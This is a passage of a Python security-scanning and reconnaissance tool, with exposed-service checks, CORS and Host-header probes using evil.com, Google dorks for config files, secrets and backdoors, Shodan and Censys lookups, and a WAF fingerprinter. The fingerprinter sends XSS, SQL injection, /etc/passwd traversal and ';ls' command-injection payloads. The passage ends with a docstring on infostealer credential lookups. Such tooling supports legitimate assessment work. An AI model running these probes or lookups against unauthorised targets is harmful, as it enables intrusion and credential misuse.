            "Jenkins API accessible without authentication — full system compromise risk")

    r, base = probe("/api/json")
    if r and r.status_code == 200 and matches(r.text, "Jenkins", "hudson"):
        add("Jenkins Root API Anonymous Access", "critical", "/api/json",
            "Jenkins root API accessible without auth")

    # Grafana anonymous access + version
    r, base = probe("/api/health")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "grafana" in str(j).lower() or "database" in j:
                ver = j.get("version", "unknown")
                add(f"Grafana API Accessible (v{ver})", "high", "/api/health",
                    f"Grafana health endpoint accessible — version {ver}")
        except Exception:
            pass

    # Kibana
    r, base = probe("/app/kibana")
    if r and r.status_code == 200 and matches(r.text, "kibana", "elastic"):
        add("Kibana Dashboard Exposed", "high", "/app/kibana",
            "Kibana is accessible — may expose Elasticsearch data")

    # Elasticsearch cluster info
    r, base = probe(":9200/", schemes=[f"http://{domain}"]) or probe("/")
    if r and r.status_code == 200:
        try:
            j = r.json()
            if "cluster_name" in j or "elasticsearch" in str(j).lower():
                ver = j.get("version", {}).get("number", "unknown")
                add(f"Elasticsearch Exposed (v{ver})", "critical", "/:9200/",
                    f"Elasticsearch {ver} cluster accessible without auth — full data exposure")
        except Exception:
            pass

    # MongoDB Express
    r, base = probe("/db/admin/")
    if r and r.status_code == 200 and matches(r.text, "mongo", "collection", "database"):
        add("Mongo Express Exposed", "critical", "/db/admin/",
            "Mongo Express web interface is accessible — full database access")

    # Hadoop YARN RCE
    r, base = probe("/ws/v1/cluster/info", schemes=[f"http://{domain}"])
    if r and r.status_code == 200 and matches(r.text, "hadoop", "yarn", "clusterInfo"):
        add("Hadoop YARN REST API Exposed", "critical", "/ws/v1/cluster/info",
            "Hadoop YARN ResourceManager API is accessible — potential RCE via app submission")

    # Redis (via HTTP probe on port 6379 — limited check)
    # Consul API
    r, base = probe("/v1/agent/self", schemes=[f"http://{domain}"])
    if r and r.status_code == 200 and matches(r.text, "consul", "Config", "NodeName"):
        add("Consul Agent API Exposed", "critical", "/v1/agent/self",
            "HashiCorp Consul agent API is accessible without authentication")

    # ═══════════════════════════════════════════════════════
    # 5. SSRF + OPEN REDIRECT DETECTION
    # ═══════════════════════════════════════════════════════

    # (Open-redirect probing removed — it produced false positives on hosts that
    #  redirect to their own www/apex while echoing the payload in the query
    #  string, and confirming a real open redirect reliably needs more than a
    #  substring match on the Location header.)

    # ═══════════════════════════════════════════════════════
    # 6. MISCONFIGURATION DETECTION
    # ═══════════════════════════════════════════════════════

    # CORS wildcard misconfiguration
    r, base = probe("/api/", extra_headers={"Origin": "https://evil.com"})
    if r:
        acao = r.headers.get("access-control-allow-origin", "")
        acac = r.headers.get("access-control-allow-credentials", "")
        if acao == "*" and "true" in acac.lower():
            add("CORS Wildcard + Credentials (Critical)", "critical", "/api/",
                "Access-Control-Allow-Origin: * with Credentials: true — authentication bypass risk")
        elif acao == "https://evil.com":
            add("CORS Arbitrary Origin Reflected", "high", "/api/",
                f"CORS reflects arbitrary Origin: {acao} — potential credential theft")

    # HTTP TRACE method enabled
    r, base = probe("/", method="GET", extra_headers={"X-Custom-Header": "trace-test"})
    try:
        trace_r = requests.request("TRACE", f"{base}/", headers=HEADERS,
                                   timeout=5, verify=False, allow_redirects=False)
        if trace_r.status_code == 200 and "trace-test" in trace_r.text:
            add("HTTP TRACE Method Enabled", "medium", "/",
                "TRACE method enabled — XST (Cross-Site Tracing) attack possible")
    except Exception:
        pass

    # Host header injection
    r, base = probe("/", extra_headers={"Host": "evil.com"})
    if r and r.status_code == 200:
        if "evil.com" in r.text:
            add("Host Header Injection", "high", "/",
                "Server reflects arbitrary Host header value — password reset poisoning risk")

    # Clickjacking — missing X-Frame-Options
    r, base = probe("/")
    if r and r.status_code == 200:
        xfo = r.headers.get("x-frame-options", "")
        csp = r.headers.get("content-security-policy", "")
        if not xfo and "frame-ancestors" not in csp:
            add("Clickjacking — No X-Frame-Options", "medium", "/",
                "No X-Frame-Options or CSP frame-ancestors — site can be embedded in iframes")

    return findings




# ═══════════════════════════════════════════════════════════════
# MODULE: DORKS
# ═══════════════════════════════════════════════════════════════

def generate_dorks(domain):
    return {
        "File & Directory Discovery": [
            ("Directory Listings", f'site:{domain} intitle:"index of"'),
            ("Config Files", f'site:{domain} ext:xml | ext:conf | ext:cnf | ext:cfg | ext:ini | ext:env'),
            ("Database Files", f'site:{domain} ext:sql | ext:dbf | ext:mdb'),
            ("Log Files", f'site:{domain} ext:log'),
            ("Backup Files", f'site:{domain} ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup'),
            ("Exposed Documents", f'site:{domain} ext:doc | ext:docx | ext:pdf | ext:rtf | ext:ppt | ext:csv | ext:xls'),
            (".env Files", f'site:{domain} ext:env | inurl:.env'),
            (".git Exposure", f'site:{domain} inurl:".git" intitle:"index of"'),
            ("YAML Configs", f'site:{domain} ext:yml | ext:yaml inurl:config'),
            ("/etc/ Listing", f'site:{domain} intitle:"index of" "/etc/"'),
            ("pom.xml", f'site:{domain} inurl:pom.xml'),
            ("PHP Config", f'site:{domain} inurl:conf.php'),
            ("download.php", f'site:{domain} inurl:download.php'),
        ],
        "WordPress & CMS": [
            ("WordPress Sites", f'site:{domain} inurl:wp-content | inurl:wp-includes'),
            ("WP Login", f'site:{domain} inurl:wp-login.php'),
            ("WP Config Backup", f'site:{domain} inurl:wp-config ext:bak | ext:txt | ext:old'),
            ("WP Debug Log", f'site:{domain} inurl:wp-content/debug.log'),
            ("WP Uploads", f'site:{domain} intitle:"index of" "wp-content/uploads"'),
            ("WP Plugin Vulns", f'site:{domain} inurl:wp-content/plugins/contact-form-7'),
            ("WP xmlrpc.php", f'site:{domain} inurl:xmlrpc.php'),
            ("Drupal Login", f'site:{domain} inurl:user/login intitle:Drupal'),
            ("Joomla DB", f'site:{domain} inurl:joomla/database'),
        ],
        "Database & SQL": [
            ("SQL Errors", f'site:{domain} intext:"sql syntax near" | intext:"Warning: mysql_connect()" | intext:"Warning: pg_connect()"'),
            ("SQL Files", f'site:{domain} ext:sql intext:insert | intext:select'),
            ("MySQL Config", f'site:{domain} ext:cnf intext:password'),
            ("SQL Dumps", f'site:{domain} intitle:"index of" ext:sql | ext:dump'),
            ("MongoDB", f'site:{domain} inurl:mongodb | inurl:27017'),
        ],
        "Auth & Admin": [
            ("Login Pages", f'site:{domain} inurl:login | inurl:signin | inurl:auth'),
            ("Admin Pages", f'site:{domain} inurl:admin | inurl:administrator'),
            ("Admin Portal ASPX", f'site:{domain} inurl:admin.aspx'),
            ("phpMyAdmin", f'site:{domain} inurl:phpmyadmin'),
            ("cPanel", f'site:{domain} inurl:cpanel | inurl:2082 | inurl:2083'),
            ("Admin Backups", f'site:{domain} inurl:admin ext:bak | ext:old'),
        ],
        "Vulnerabilities": [
            ("phpinfo()", f'site:{domain} ext:php intitle:phpinfo "published by the PHP Group"'),
            ("Backdoors/Shells", f'site:{domain} inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd'),
            ("Install/Setup", f'site:{domain} inurl:install | inurl:setup ext:php'),
            ("Open Redirects", f'site:{domain} inurl:url= | inurl:return= | inurl:next= | inurl:redirect='),
            ("Apache Struts", f'site:{domain} ext:action | ext:struts | ext:do'),
            (".htaccess", f'site:{domain} inurl:.htaccess'),
            ("crossdomain.xml", f'site:{domain} inurl:crossdomain.xml'),
            ("File Upload", f'site:{domain} inurl:upload | inurl:file_upload'),
            ("SSRF Params", f'site:{domain} inurl:url= | inurl:uri= | inurl:path= | inurl:src='),
            ("Debug/Trace", f'site:{domain} intext:"stack trace" | intext:"traceback"'),
            ("Server Status", f'site:{domain} inurl:server-status | inurl:server-info'),
            ("GeoServer", f'site:{domain} inurl:geoserver'),
            ("ArcGIS REST", f'site:{domain} inurl:ArcGIS/rest/services'),
        ],
        "API & Config": [
            ("API Endpoints", f'site:{domain} inurl:api | inurl:v1 | inurl:v2 | inurl:graphql'),
            ("Swagger/OpenAPI", f'site:{domain} inurl:swagger | inurl:api-docs'),
            ("JWKS Files", f'site:{domain} inurl:jwks-rsa | inurl:.well-known/jwks'),
            ("docker-compose", f'site:{domain} inurl:docker-compose.yml'),
            ("Firebase Config", f'site:{domain} inurl:firebaseio.com'),
            ("GraphQL", f'site:{domain} inurl:graphiql | inurl:graphql/console'),
            ("JSON-RPC", f'site:{domain} inurl:jsonrpc'),
            ("main.yml", f'site:{domain} inurl:main.yml'),
        ],
        "OSINT & Social": [
            ("Pastebin", f'site:pastebin.com "{domain}"'),
            ("LinkedIn", f'site:linkedin.com employees "{domain}"'),
            ("GitHub Code", f'site:github.com "{domain}"'),
            ("Reddit", f'site:reddit.com "{domain}"'),
            ("StackOverflow", f'site:stackoverflow.com "{domain}"'),
            ("Trello", f'site:trello.com "{domain}"'),
            ("GitHub Secrets", f'site:github.com "{domain}" password | secret | token | api_key'),
        ],
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: OSINT URLS
# ═══════════════════════════════════════════════════════════════

def generate_osint_urls(domain):
    d = quote(domain)
    return {
        "Subdomain & Cert Discovery": [
            ("crt.sh", f"https://crt.sh/?q=%25.{d}"),
            ("DNSDumpster", "https://dnsdumpster.com/"),
            ("SecurityTrails", f"https://securitytrails.com/domain/{d}/dns"),
        ],
        "Threat Intelligence": [
            ("VirusTotal", f"https://www.virustotal.com/gui/domain/{d}"),
            ("AlienVault OTX", f"https://otx.alienvault.com/indicator/domain/{d}"),
            ("URLScan.io", f"https://urlscan.io/search/#{d}"),
            ("AbuseIPDB", f"https://www.abuseipdb.com/check/{d}"),
            ("IBM X-Force", f"https://exchange.xforce.ibmcloud.com/url/{d}"),
            ("Pulsedive", f"https://pulsedive.com/indicator/?ioc={d}"),
            ("ThreatCrowd", f"https://www.threatcrowd.org/domain.php?domain={d}"),
        ],
        "Infrastructure": [
            ("Shodan", f"https://www.shodan.io/search?query={d}"),
            ("Censys Hosts", f"https://platform.censys.io/search?q=%28%22{d}%22%29+and+host.ip%3A+*"),
            ("Censys Certs", f"https://search.censys.io/certificates?q={d}"),
            ("ZoomEye", f"https://www.zoomeye.org/searchResult?q={d}"),
            ("FullHunt", f"https://fullhunt.io/search?query={d}"),
        ],
        "Archive & History": [
            ("Wayback Machine", f"https://web.archive.org/web/*/{d}"),
            ("Wayback URLs", f"https://web.archive.org/cdx/search/cdx?url=*.{d}&output=text&fl=original&collapse=urlkey"),
        ],
        "Bug Bounty": [
            ("OpenBugBounty", f"https://www.openbugbounty.org/search/?search={d}"),
            ("HackerOne", f"https://hackerone.com/directory/programs?query={d}"),
        ],
        "Code & Leaks": [
            ("GitHub Code", f"https://github.com/search?q=%22{d}%22&type=code"),
            ("GitLab", f"https://gitlab.com/search?search={d}"),
            ("Grep.app", f"https://grep.app/search?q={d}"),
            ("IntelX", f"https://intelx.io/?s={d}"),
            ("Pastebin", f"https://www.google.com/search?q=site:pastebin.com+%22{d}%22"),
        ],
        "Email": [
            ("Hunter.io", f"https://hunter.io/try/search/results?domain={d}"),
            ("EmailRep", f"https://emailrep.io/query/{d}"),
        ],
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: SHODAN (free InternetDB — no API key)
# ═══════════════════════════════════════════════════════════════

def scan_shodan(domain):
    """
    Uses Shodan InternetDB (completely free, no API key) to pull:
      - Open ports, hostnames, tags, CPEs, CVEs for the domain's IPs.
    If a Shodan API key is configured (SHODAN_API_KEY env var), also
    queries the full /shodan/host endpoint for richer data.
    """
    import os

    ips = resolve(domain)
    all_v4 = ips.get("v4", [])
    if not all_v4:
        return {"error": "Cannot resolve domain to IPv4"}

    api_key = os.environ.get("SHODAN_API_KEY", "").strip()
    results = {"ips": {}, "summary": {"total_cves": 0, "total_ports": 0, "critical_cves": []}}

    for ip in all_v4[:5]:  # cap at 5 IPs
        ip_data = {"ip": ip, "ports": [], "hostnames": [], "tags": [],
                   "cpes": [], "cves": [], "vulns": [], "os": None,
                   "isp": None, "org": None, "country": None, "api_data": None}

        # --- InternetDB (always free, no key needed) ---
        try:
            r = req(f"https://internetdb.shodan.io/{ip}", timeout=10)
            if r:
                d = r.json()
                ip_data["ports"]     = d.get("ports", [])
                ip_data["hostnames"] = d.get("hostnames", [])
                ip_data["tags"]      = d.get("tags", [])
                ip_data["cpes"]      = d.get("cpes", [])
                raw_cves = d.get("vulns", []) or []
                base_cves = [{"id":c,"cvss":None,"severity":"","summary":"","kev":False}
                             if isinstance(c,str) else c for c in raw_cves]
                ip_data["cves"] = base_cves
                results["summary"]["total_ports"] += len(ip_data["ports"])
                results["summary"]["total_cves"]  += len(base_cves)
                def _enrich_cve(e):
                    cid = e.get("id","")
                    if not cid or e.get("summary"): return e
                    try:
                        r2 = req(f"https://cvedb.shodan.io/cve/{cid}", timeout=5)
                        if r2:
                            j = r2.json()
                            cvss = float(j.get("cvss_v3") or j.get("cvss") or j.get("cvss_v2") or 0)
                            sev = "critical" if cvss>=9 else "high" if cvss>=7 else "medium" if cvss>=4 else "low" if cvss>0 else ""
                            return {"id":cid,"cvss":round(cvss,1),"severity":sev,
                                    "summary":(j.get("summary") or "")[:150],
                                    "kev":bool(j.get("kev")),"epss":round(float(j.get("epss") or 0),4)}
                    except: pass
                    return e
                with concurrent.futures.ThreadPoolExecutor(max_workers=5) as _cx:
                    ip_data["cves"] = list(_cx.map(_enrich_cve, base_cves[:15]))
        except Exception:
            pass

        # --- Full Shodan API (optional, needs SHODAN_API_KEY env var) ---
        if api_key:
            try:
                r2 = req(f"https://api.shodan.io/shodan/host/{ip}?key={api_key}", timeout=15)
                if r2:
                    d2 = r2.json()
                    ip_data["os"]      = d2.get("os")
                    ip_data["isp"]     = d2.get("isp")
                    ip_data["org"]     = d2.get("org")
                    ip_data["country"] = d2.get("country_name")
                    # Enrich CVEs with CVSS scores
                    vulns = d2.get("vulns", {})
                    enriched = []
                    for cve_id, cve_info in vulns.items():
                        cvss = cve_info.get("cvss", 0) or 0
                        enriched.append({
                            "id": cve_id,
                            "cvss": cvss,
                            "summary": cve_info.get("summary", "")[:120],
                            "references": cve_info.get("references", [])[:2],
                        })
                    enriched.sort(key=lambda x: float(x["cvss"] or 0), reverse=True)
                    ip_data["vulns"] = enriched
                    # Banner data — services
                    services = []
                    for item in d2.get("data", []):
                        svc = {
                            "port": item.get("port"),
                            "transport": item.get("transport", "tcp"),
                            "product": item.get("product", ""),
                            "version": item.get("version", ""),
                            "banner": (item.get("data", "") or "")[:100].strip(),
                        }
                        if svc["port"]:
                            services.append(svc)
                    ip_data["api_data"] = {"services": services[:20]}
            except Exception:
                pass

        # Track critical CVEs (CVSS >= 9.0) across all IPs
        for vuln in ip_data.get("vulns", []):
            if float(vuln.get("cvss") or 0) >= 9.0:
                results["summary"]["critical_cves"].append({
                    "ip": ip, "cve": vuln["id"], "cvss": vuln["cvss"]
                })

        ip_data["shodan_host_url"] = f"https://www.shodan.io/host/{ip}"
        results["ips"][ip] = ip_data

    results["api_key_used"] = bool(api_key)
    results["domain"] = domain
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: CENSYS (free unauthenticated search + deep link)
# ═══════════════════════════════════════════════════════════════

def scan_censys(domain):
    """
    Censys integration — two tiers:

    Tier 1 (always, no key): resolves IPs then scrapes the Censys
    search page for visible metadata + builds deep-link URLs for
    every interesting query (hosts, certs, domain, ASN, etc.)

    Tier 2 (if CENSYS_API_ID + CENSYS_API_SECRET env vars set):
    queries the official Censys Search v2 API for full structured
    data: open ports, services, TLS certs, location, ASN, labels.
    """
    import os

    ips = resolve(domain)
    all_v4 = ips.get("v4", [])

    api_id     = os.environ.get("CENSYS_API_ID", "").strip()
    api_secret = os.environ.get("CENSYS_API_SECRET", "").strip()
    has_api    = bool(api_id and api_secret)

    d = quote(domain)
    results = {
        "domain": domain,
        "ips": all_v4,
        "api_used": has_api,
        "links": {},
        "ip_data": {},
        "certificates": [],
        "summary": {},
    }

    # ── Deep-link URLs (always generated, no key needed) ──
    results["links"] = {
        # platform.censys.io — correct query syntax: ("domain.com") and host.ip: *
        "search_platform":  f"https://platform.censys.io/search?q=%28%22{d}%22%29+and+host.ip%3A+*",
        "hosts_by_ip":      [f"https://search.censys.io/hosts/{ip}" for ip in all_v4[:5]],
        "certificates":     f"https://search.censys.io/certificates?q=parsed.names%3A{d}",
        "subdomains":       f"https://search.censys.io/certificates?q=parsed.names%3A*.{d}",
        "asn_lookup":       f"https://search.censys.io/hosts?q=autonomous_system.name%3A{d}",
    }

    # ── Unauthenticated: try Censys search page for surface-level info ──
    if all_v4:
        for ip in all_v4[:3]:
            try:
                r = req(f"https://internetdb.shodan.io/{ip}", timeout=8)
                # Reuse shodan InternetDB as a quick port/service enrichment
                # since Censys doesn't have a free unauthenticated API endpoint
                if r:
                    d2 = r.json()
                    results["ip_data"][ip] = {
                        "ports": d2.get("ports", []),
                        "hostnames": d2.get("hostnames", []),
                        "cpes": d2.get("cpes", []),
                        "cves": d2.get("vulns", []),
                        "tags": d2.get("tags", []),
                        "source": "internetdb_enrichment",
                    }
            except Exception:
                pass

    # ── crt.sh for certificate data (free, no key) ──
    try:
        r = req(f"https://crt.sh/?q={d}&output=json", timeout=20)
        if r:
            certs = []
            seen = set()
            for entry in r.json()[:50]:
                cn = entry.get("common_name", "")
                issuer = entry.get("issuer_name", "")
                not_before = entry.get("not_before", "")[:10]
                not_after  = entry.get("not_after", "")[:10]
                key = (cn, not_after)
                if key not in seen:
                    seen.add(key)
                    certs.append({
                        "common_name": cn,
                        "issuer": issuer,
                        "not_before": not_before,
                        "not_after": not_after,
                        "id": entry.get("id"),
                    })
            results["certificates"] = certs[:20]
    except Exception:
        pass

    # ── Full Censys API (optional) ──
    if has_api:
        import base64
        auth = base64.b64encode(f"{api_id}:{api_secret}".encode()).decode()
        headers = {"Authorization": f"Basic {auth}", "Content-Type": "application/json"}

        for ip in all_v4[:5]:
            try:
                r = req(f"https://search.censys.io/api/v2/hosts/{ip}", headers=headers, timeout=15)
                if r:
                    host = r.json().get("result", {})
                    services = []
                    for svc in host.get("services", []):
                        services.append({
                            "port": svc.get("port"),
                            "transport_protocol": svc.get("transport_protocol", "TCP"),
                            "service_name": svc.get("service_name", ""),
                            "product": svc.get("software", [{}])[0].get("product", "") if svc.get("software") else "",
                            "tls_subject": (svc.get("tls", {}) or {}).get("certificates", {}).get("leaf_data", {}).get("subject_dn", ""),
                        })
                    loc = host.get("location", {})
                    asn = host.get("autonomous_system", {})
                    results["ip_data"][ip] = {
                        "services": services,
                        "os":       host.get("operating_system", {}).get("product", ""),
                        "country":  loc.get("country", ""),
                        "city":     loc.get("city", ""),
                        "asn":      asn.get("asn", ""),
                        "asn_name": asn.get("name", ""),
                        "labels":   host.get("labels", []),
                        "source":   "censys_api",
                    }
            except Exception:
                pass

        # Certificate search via API
        try:
            payload = json.dumps({"q": domain, "per_page": 25})
            import urllib.request
            req2 = urllib.request.Request(
                "https://search.censys.io/api/v2/certificates/search",
                data=payload.encode(),
                headers={"Authorization": f"Basic {auth}", "Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req2, timeout=15) as resp:
                cert_data = json.loads(resp.read())
                for hit in cert_data.get("result", {}).get("hits", [])[:10]:
                    parsed = hit.get("parsed", {})
                    results["certificates"].append({
                        "common_name": parsed.get("subject_dn", ""),
                        "issuer": parsed.get("issuer_dn", ""),
                        "not_before": parsed.get("validity", {}).get("start", "")[:10],
                        "not_after": parsed.get("validity", {}).get("end", "")[:10],
                        "fingerprint": hit.get("fingerprint_sha256", "")[:16] + "...",
                        "source": "censys_api",
                    })
        except Exception:
            pass

    results["summary"] = {
        "ips_found": len(all_v4),
        "certs_found": len(results["certificates"]),
        "api_used": has_api,
    }
    return results


# ═══════════════════════════════════════════════════════════════
# MODULE: WAFW00F (tool + Python fallback)
# ═══════════════════════════════════════════════════════════════

def scan_wafw00f(domain):
    """
    WAF detection via two methods:
    1. wafw00f binary (if installed): pip install wafw00f
    2. Python fallback: HTTP-based fingerprinting using 40+ WAF
       signatures across headers, cookies, response body, and
       error-page injection probes.
    """
    import subprocess
    import shutil

    wafw00f_bin = shutil.which("wafw00f")

    if wafw00f_bin:
        try:
            result = subprocess.run(
                [wafw00f_bin, f"https://{domain}", "-a", "-o", "-"],
                capture_output=True, text=True, timeout=45
            )
            output = result.stdout + result.stderr
            detected = _parse_wafw00f_output(output)
            return {
                "source":         "wafw00f_binary",
                "raw":            output[:3000],
                "detected":       detected,
                "waf_found":      bool(detected),
                "waf_confidence": "high" if detected else "none",
            }
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass

    return _wafw00f_python(domain)


def _parse_wafw00f_output(output):
    """Parse wafw00f text output into list of WAF names."""
    detected = []
    for line in output.split("\n"):
        m = re.search(r'is behind (.+?)(?:\s+WAF|\s+\(|\s*$)', line, re.IGNORECASE)
        if m:
            detected.append(m.group(1).strip())
        # Also catch "The site ... is protected by ... firewall"
        m2 = re.search(r'protected by (.+?)(?:\s+firewall|\s*$)', line, re.IGNORECASE)
        if m2 and m2.group(1).strip() not in detected:
            detected.append(m2.group(1).strip())
    return list(set(detected))


def _wafw00f_python(domain):
    """
    Python-based WAF fingerprinter.
    Phase 1: passive — inspect headers/cookies on normal request.
    Phase 2: active  — inject a simple XSS probe and inspect the
             error response (block pages, challenge pages, etc.)
    """
    if not HAS_REQUESTS:
        return {"error": "requests required", "source": "python_fallback"}

    WAF_SIGNATURES = {
        # Format: "WAF Name": {"header": [...], "cookie": [...], "body": [...], "server": [...]}
        "Cloudflare": {
            "header": ["cf-ray", "cf-cache-status", "cf-request-id"],
            "cookie":  ["__cfduid", "cf_clearance", "__cf_bm"],
            "server":  ["cloudflare"],
            "body":    ["Attention Required! | Cloudflare", "Ray ID:", "DDoS protection by Cloudflare"],
        },
        "AWS WAF / Shield": {
            "header": ["x-amzn-requestid", "x-amz-cf-id", "x-amzn-trace-id"],
            "server":  ["awselb", "amazons3"],
            "body":    ["AWS WAF", "Request blocked"],
        },
        "Akamai Kona": {
            "header": ["akamai-ghost-ip", "x-akamai-transformed", "x-check-cacheable"],
            "server":  ["akamaighost", "akamai"],
            "body":    ["Access Denied", "Reference #18.", "AkamaiGHost"],
        },
        "Imperva / Incapsula": {
            "header": ["x-iinfo", "x-cdn"],
            "cookie":  ["incap_ses", "visid_incap"],
            "body":    ["Incapsula incident ID", "/_Incapsula_Resource"],
        },
        "F5 BIG-IP ASM": {
            "header": ["x-waf-event-info", "x-cnection"],
            "cookie":  ["ts", "BIGipServer"],
            "body":    ["The requested URL was rejected", "F5 Networks"],
            "server":  ["BigIP", "BIG-IP"],
        },
        "Sucuri": {
            "header": ["x-sucuri-id", "x-sucuri-cache"],
            "server":  ["Sucuri/Cloudproxy"],
            "body":    ["Access Denied - Sucuri Website Firewall", "sucuri.net"],
        },
        "Barracuda WAF": {
            "cookie":  ["barra_counter_session", "BNI__BARRACUDA_LB_COOKIE"],
            "body":    ["barracuda", "Barracuda Networks"],
        },
        "Fortinet FortiWeb": {
            "header": ["x-protected-by"],
            "cookie":  ["FORTIWAFSID"],
            "body":    ["FortiWeb", "Application Firewall", ".fgd_icon"],
            "server":  ["fortigate"],
        },
        "ModSecurity": {
            "body":    ["ModSecurity", "This error was generated by Mod_Security",
                        "mod_security", "NOYB"],
            "header": ["x-mod-security"],
        },
        "Wordfence": {
            "body":    ["generated by Wordfence", "Wordfence", "wfCBLlookup"],
        },
        "Nginx WAF": {
            "body":    ["nginx", "openresty"],
            "server":  ["nginx", "openresty"],
        },
        "Wallarm": {
            "header": ["x-wallarm-node"],
            "body":    ["Wallarm", "wallarm"],
        },
        "Radware AppWall": {
            "body":    ["Unauthorized Activity Has Been Detected", "Radware"],
            "cookie":  ["RDWR"],
        },
        "DenyALL WAF": {
            "cookie":  ["sessioncookie"],
            "body":    ["DenyALL", "Denied by Deny All"],
        },
        "Reblaze": {
            "cookie":  ["rbzid"],
            "header": ["x-reblaze-protection"],
            "body":    ["reblaze"],
        },
        "StackPath": {
            "header": ["x-sp-url", "x-sp-waf"],
            "body":    ["StackPath", "stackpath"],
        },
        "Varnish": {
            "header": ["x-varnish", "via"],
            "body":    ["varnish cache server"],
            "server":  ["varnish"],
        },
        "Fastly": {
            "header": ["x-fastly-request-id", "fastly-restarts"],
            "server":  ["fastly"],
        },
        "Vercel Edge": {
            "header": ["x-vercel-id", "x-vercel-cache"],
            "server":  ["vercel"],
        },
        "Pantheon": {
            "header": ["x-pantheon-styx-hostname"],
            "cookie":  ["STYXKEY"],
        },
        "Squarespace": {
            "header": ["x-sqsp-version"],
        },
        "Netlify": {
            "header": ["x-nf-request-id"],
            "server":  ["netlify"],
        },
        "Azure Front Door": {
            "header": ["x-azure-ref", "x-fd-healthprobe"],
            "server":  ["Microsoft-Azure-Application-Gateway"],
        },
        "Google Cloud Armor": {
            "header": ["x-cloud-trace-context", "x-goog-backend"],
            "server": ["gfe", "google frontend", "gws"],
            "body":   ["google cloud armor", "request blocked by cloud armor"],
        },
        "Edgio / Limelight": {
            "header": ["x-hw", "x-ec-custom-error"],
        },
        "DataDome": {
            "cookie":  ["datadome"],
            "body":    ["datadome", "DataDome"],
        },
        "Kasada": {
            "header": ["x-kpsdk-ct"],
            "body":    ["kasada"],
        },
        "PerimeterX": {
            "header": ["x-px-logid"],
            "cookie":  ["_px", "_pxhd", "_pxvid"],
            "body":    ["PerimeterX", "px-captcha"],
        },
        "hCaptcha / Bot Protection": {
            "body":    ["hcaptcha.com", "h-captcha"],
        },
        "Kona (Akamai Bot Manager)": {
            "cookie":  ["ak_bmsc", "_abck"],
            "header": ["x-akamai-edgescape"],
        },
    }

    # Phase 1: Normal GET request
    normal_resp = None
    for scheme in ["https", "http"]:
        try:
            normal_resp = requests.get(
                f"{scheme}://{domain}", timeout=10, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
                                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
                verify=False,
            )
            break
        except Exception:
            continue

    # Phase 2: Probe request with a benign XSS-like payload
    probe_resp = None
    PROBE_PATHS = [
        "/?q=<script>alert(1)</script>",
        "/?id=1%27%20OR%20%271%27=%271",
        "/?file=../../../etc/passwd",
        "/?cmd=;ls",
    ]
    for path in PROBE_PATHS:
        try:
            probe_resp = requests.get(
                f"https://{domain}{path}", timeout=8, allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"},
                verify=False,
            )
            break
        except Exception:
            continue

    detections = {}

    def check_response(resp, phase):
        if not resp:
            return
        hdrs = {k.lower(): v.lower() for k, v in resp.headers.items()}
        body = (resp.text or "")[:10000].lower()
        cookies = {c.name.lower(): c.value.lower() for c in resp.cookies}
        server = hdrs.get("server", "")

        for waf, sigs in WAF_SIGNATURES.items():
            score = 0
            matched = []
            for h in sigs.get("header", []):
                if h.lower() in hdrs:
                    score += 2
                    matched.append(f"header:{h}")
            for c in sigs.get("cookie", []):
                if any(c.lower() in ck for ck in cookies):
                    score += 3
                    matched.append(f"cookie:{c}")
            for b in sigs.get("body", []):
                if b.lower() in body:
                    score += 2
                    matched.append(f"body:{b[:30]}")
            for s in sigs.get("server", []):
                if s.lower() in server:
                    score += 3
                    matched.append(f"server:{s}")
            if score > 0:
                if waf not in detections:
                    detections[waf] = {"score": 0, "evidence": [], "phases": []}
                detections[waf]["score"] += score
                detections[waf]["evidence"].extend(matched)
                if phase not in detections[waf]["phases"]:
                    detections[waf]["phases"].append(phase)

    check_response(normal_resp, "passive")
    check_response(probe_resp, "probe")

    # Check if probe got blocked (status 403/406/429/503)
    probe_blocked = False
    probe_status = None
    if probe_resp:
        probe_status = probe_resp.status_code
        if probe_resp.status_code in (403, 406, 429, 503):
            probe_blocked = True

    # Build sorted result list
    detected_list = []
    for waf, info_d in sorted(detections.items(), key=lambda x: -x[1]["score"]):
        detected_list.append({
            "waf": waf,
            "confidence": "high" if info_d["score"] >= 5 else "medium" if info_d["score"] >= 3 else "low",
            "score": info_d["score"],
            "evidence": list(set(info_d["evidence"]))[:6],
            "phases": info_d["phases"],
        })

    # Deduplicate overlapping WAFs (e.g. Cloudflare + Cloudflare WAF from tech module)
    seen_wafs = set()
    unique_detected = []
    for d_item in detected_list:
        key = d_item["waf"].split()[0].lower()
        if key not in seen_wafs:
            seen_wafs.add(key)
            unique_detected.append(d_item)

    high_conf = [w for w in unique_detected if w["confidence"] in ("high", "medium")]

    return {
        "source":         "python_fallback",
        "waf_found":      bool(high_conf or unique_detected),
        "waf_confidence": "none" if not unique_detected else ("high" if high_conf else "low"),
        "detected":       unique_detected,
        "high_confidence": high_conf,
        "probe_blocked":  probe_blocked,
        "probe_status":   probe_status,
        "normal_status":  normal_resp.status_code if normal_resp else None,
    }


# ═══════════════════════════════════════════════════════════════
# MODULE: BREACH INTELLIGENCE (leaks, infostealer, credentials)
# ═══════════════════════════════════════════════════════════════

def scan_breachintel(domain):
    """
    Aggregates breach & credential leak intelligence from 4 free sources:

    Source 1 — Hudson Rock Cavalier (FREE, no key)
        Infostealer database: stolen credentials, victim machine metadata,
        compromised dates, victim IPs, computer names, anti-virus status.
        Endpoints:
          /search-by-domain   → corporate infostealer hits
          /urls-by-domain     → stolen URL/credential pairs

    Source 2 — Chiasmodon API (FREE tier, no key required)
        Credential leak search:
          /CompanyEmployeLogins  → employee username+password combos
          /CompanyClientLogins   → customer credential leaks
          /CompanyEmails         → email enumeration
          /CompanyRelated        → related domains

    Source 3 — HaveIBeenPwned public breach list (FREE, no key)
        Checks domain against all known public breaches.
        Returns breach names, dates, data classes exposed.

        Domain-based breach lookup with source names.

